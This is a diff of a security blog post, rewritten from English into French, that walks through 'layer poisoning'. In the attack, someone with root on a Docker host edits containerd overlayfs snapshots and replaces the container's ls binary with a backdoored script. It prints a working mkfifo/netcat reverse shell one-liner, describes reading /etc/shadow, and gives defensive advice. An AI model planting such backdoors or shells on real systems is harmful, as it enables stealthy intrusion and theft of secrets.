@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Layer poisoning</title>
+    <title>Layer Poisoning : Attaquer Docker par ses fondations</title>
     <link rel="stylesheet" href="../../styles/style.css" />
   </head>
   <body>
@@ -20,70 +20,98 @@
     </header>
 
     <main class="container page-content">
-      <section class="section">
-        <h1>Layer poisoning - compromising docker through its foundations</h1>
-        <p>This post explains an offensive technique on a Docker host: <strong>layer poisoning</strong>. I describe Docker/overlayfs layers, then walk through each screenshot from the proof of concept.</p>
+      <article class="section">
+        <h1>Layer Poisoning, l'art de compromettre Docker par ses fondations</h1>
+        
+        <p class="post-intro">
+          On nous présente souvent les conteneurs Docker comme des environnements isolés et immuables. Pourtant, il existe une technique d'attaque appelée <strong>Layer Poisoning</strong>. Elle permet de compromettre un conteneur en modifiant silencieusement ses couches de système de fichiers directement sur l'hôte. Retour sur une manipulation qui casse le mythe de l'isolation parfaite.
+        </p>
 
-        <h2>1. What is layer poisoning?</h2>
-        <p>Layer poisoning refers to modifying a container layer or docker storage snapshot to inject malicious code into a container. It is not a docker bug by itself, but a consequence of the way docker stores container files via overlayfs layers. If an attacker can access the Docker engine filesystem, they can tamper with files visible to the container.</p>
+        <hr>
 
-        <h2>2. Docker and overlayfs: how do layers work?</h2>
-        <p>Docker builds images in multiple layers. Each container runs with a final filesystem created by stacking:</p>
+        <h2>1. Le concept : Empoisonner la source</h2>
+        <p>
+          Le "Layer Poisoning" consiste à injecter du code malveillant dans les snapshots de stockage de Docker (gérés par <em>containerd</em>). Ce n'est pas un bug de Docker en soi, mais une exploitation directe de son architecture. Si un attaquant parvient à obtenir un accès root sur l'hôte, il peut modifier les fichiers "sources" que le conteneur utilise pour démarrer. Résultat ? Une backdoor persistante, invisible pour les outils de scan classiques.
+        </p>
+
+        <h2>2. Les coulisses : Docker et OverlayFS</h2>
+        <p>
+          Pour comprendre l'attaque, il faut comprendre <strong>OverlayFS</strong>. Docker empile les couches d'images pour former le système de fichiers final du conteneur. Ce mécanisme repose sur trois piliers :
+        </p>
         <ul>
-          <li>a read-only <strong>lowerdir</strong> representing the base image (for example Alpine);</li>
-          <li>a read-write <strong>upperdir</strong> specific to the container;</li>
-          <li>a <strong>workdir</strong> used by overlayfs to manage write operations.</li>
+          <li><strong>Lowerdir :</strong> Les couches de l'image de base (ex: Alpine), normalement en lecture seule.</li>
+          <li><strong>Upperdir :</strong> La couche d'écriture propre au conteneur (où vont vos modifications).</li>
+          <li><strong>Merged :</strong> La vue fusionnée que l'utilisateur voit à l'intérieur du conteneur.</li>
         </ul>
-        <p>Overlayfs merges these layers into a single mount point called <em>merged</em>. On the host, Docker/containerd exposes this mount under a path like <code>/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/</code>.</p>
+        <p>
+          En temps normal, le <em>lowerdir</em> est protégé. Mais sur l'hôte, ces fichiers sont stockés dans <code>/var/lib/containerd/.../snapshots/</code>. En modifiant ces snapshots, on modifie l'ADN même du conteneur.
+        </p>
 
-        <h2>3. Example attack flow</h2>
-        <p>To illustrate the attack, here is one example.</p>
+        <h2>3. Anatomie d'une attaque (Proof of Concept)</h2>
+        <p>Passons à la pratique. L'objectif ici est de transformer une commande banale (<code>ls</code>) en un vecteur de connexion pour l'attaquant.</p>
 
+        <h3>Étape 1 : Préparation de l'écouteur</h3>
         <figure>
-          <img src="images/v_lp_1.png" alt="Starting Alpine containers and preparing the test" />
-          <figcaption>Screenshot 1: pulling the Alpine image and starting two containers, <code>container_prod</code> and <code>container_dev</code>.</figcaption>
+          <img src="images/a_lp_1.png" alt="Netcat listener setup" />
+          <figcaption>Côté attaquant : On prépare un listener Netcat sur le port 4444.</figcaption>
         </figure>
 
-        <p>In the first screenshot, I am already root on the host. I pull Alpine and start two sleeping containers called <code>container_prod</code> and <code>container_dev</code> using <code>sleep 9999</code>, so their filesystem snapshots remain available and accessible on the host.</p>
-
+        <h3>Étape 2 : Identification de la cible sur l'hôte</h3>
         <figure>
-          <img src="images/v_lp_2.png" alt="Inspecting the container and overlayfs mount" />
-          <figcaption>Screenshot 2: inspecting the container and showing the matching overlayfs mount point.</figcaption>
+          <img src="images/v_lp_1.png" alt="Starting Alpine containers" />
+        </figure>
+        <p>
+          Nous lançons deux conteneurs Alpine classiques. Pour l'expérience, supposons que nous avons déjà un accès root sur l'hôte. Notre but est de trouver où ces conteneurs "vivent" physiquement.
+        </p>
+        <figure>
+          <img src="images/v_lp_2.png" alt="Inspecting container and overlayfs mount" />
+          <figcaption>On récupère l'ID du conteneur pour identifier le point de montage OverlayFS associé.</figcaption>
         </figure>
 
-        <p>In the second screenshot, I locate the Docker overlay snapshot associated with <code>container_prod</code> by retrieving its container ID and finding the corresponding overlayfs mount. The snapshot reveals a read-only <code>lowerdir</code>, a writable <code>upperdir</code>, and a <code>workdir</code>, which together form the overlay stack I target.</p>
-
+        <h3>Étape 3 : Injection du poison</h3>
         <figure>
-          <img src="images/v_lp_3.png" alt="Exploring the overlayfs snapshot" />
-          <figcaption>Screenshot 3: exploring the Docker snapshot under <code>/var/lib/containerd/.../snapshots/49/fs</code>.</figcaption>
+          <img src="images/v_lp_3.png" alt="Exploring the snapshot" />
+        </figure>
+        <p>
+          Une fois dans le snapshot (ici le n°49), nous avons accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici que nous allons agir.
+        </p>
+        <figure>
+          <img src="images/v_lp_4.png" alt="Modifying ls binary" />
+        </figure>
+        <p>
+          Nous remplaçons le binaire <code>ls</code> par un script malveillant. Ce script fait deux choses :
+          1. Il lance un <strong>Reverse Shell</strong> en arrière-plan vers l'IP de l'attaquant.
+          2. Il appelle le vrai binaire <code>ls</code> pour que l'utilisateur ne remarque rien.
+        </p>
+        <pre><code>(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1</code></pre>
+
+        <h3>Étape 4 : Le "Pop" du Shell</h3>
+        <figure>
+          <img src="images/v_lp_5.png" alt="Victim executing ls" />
+          <figcaption>L'utilisateur tape 'ls /etc'. L'affichage est normal, l'illusion est parfaite.</figcaption>
+        </figure>
+        <figure>
+          <img src="images/a_lp_2.png" alt="Attacker receiving access" />
+          <figcaption>Côté attaquant : La connexion arrive. Nous sommes root et pouvons lire les secrets (/etc/shadow, variables d'env).</figcaption>
         </figure>
 
-        <p>In the third screenshot, I list the snapshot contents. I see a complete filesystem: <code>bin</code>, <code>etc</code>, <code>lib</code>, and so on. The <code>/fs</code> directory corresponds to the filesystem that the container sees.</p>
+        <h2>4. Pourquoi cette attaque est redoutable ?</h2>
+        <p>
+          Ce qui rend le Layer Poisoning particulièrement vicieux, c'est sa discrétion. Si vous lancez un <code>docker diff</code>, Docker ne verra aucune modification. Pourquoi ? Parce que la modification a eu lieu dans le <strong>Lowerdir</strong> (l'image de base) et non dans la couche d'écriture du conteneur. De plus, tout nouveau conteneur créé à partir de cette image locale sera nativement infecté.
+        </p>
 
-        <figure>
-          <img src="images/v_lp_4.png" alt="Modifying ls binary to inject a backdoor" />
-          <figcaption>Screenshot 4: replacing the <code>ls</code> binary with a malicious script inside the snapshot.</figcaption>
-        </figure>
+        <h2>5. Conclusion et Défense</h2>
+        <p>
+          Cette démonstration prouve qu'une isolation logicielle ne vaut rien si l'intégrité de l'hôte est compromise. Pour dormir tranquille, voici quelques pistes :
+        </p>
+        <ul>
+          <li><strong>Principe du moindre privilège :</strong> Restreindre l'accès aux dossiers de <em>containerd/docker</em> sur l'hôte.</li>
+          <li><strong>Immuabilité :</strong> Utiliser des systèmes de fichiers en lecture seule (<code>--read-only</code>) pour limiter l'impact d'une intrusion.</li>
+          <li><strong>Vérification :</strong> Mettre en place des outils de monitoring d'intégrité (FIM) pour surveiller toute modification suspecte dans <code>/var/lib/docker</code>.</li>
+        </ul>
+        <p>Le Layer Poisoning nous rappelle que la sécurité d'un conteneur commence toujours par la sécurité de la machine qui l'héberge.</p>
 
-        <p>This is where the compromise happens. I move into the snapshot’s <code>/fs/bin</code> directory, rename the original <code>ls</code> to <code>ls.original</code>, and replace <code>ls</code> with a malicious shell script. The script creates a FIFO at <code>/tmp/f</code> and runs a reverse shell to <code>172.17.0.1:44444</code>.</p>
-        <p>The exact command shows the core of the layer poisoning:</p>
-        <pre><code>mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 44444 > /tmp/f &</code></pre>
-        <p>Then I make the script executable with <code>chmod +x ls</code>. At this point, the container will see this script instead of the real <code>ls</code> binary.</p>
-
-        <figure>
-          <img src="images/v_lp_5.png" alt="Verifying from the compromised container" />
-          <figcaption>Screenshot 5: running a shell inside <code>container_prod</code> to verify the compromise.</figcaption>
-        </figure>
-
-        <p>Finally, I enter the container with:</p>
-        <pre><code>docker exec -ti container_prod /bin/sh</code></pre>
-        <p>The screenshot shows that I am inside the container as <code>root</code>, with a normal-looking Alpine filesystem.</p>
-        <p>In short, this attack shows that a container can be poisoned by modifying its files on the host. If the host is compromised, a Docker container can be compromised too, and overlayfs layers increase the security risk because the attack happens at runtime, not at the image source.</p>
-
-        <h2>4. Defense and best practices</h2>
-        <p>According to me, the best practice is to never give unauthorized users direct access to containerd files. It is also important to separate the host and the workloads with strict access policies and, if possible, use hardened runtimes or read-only host configurations for Docker hosts.</p>
-
-      </section>
+      </article>
     </main>
 
     <footer class="site-footer">
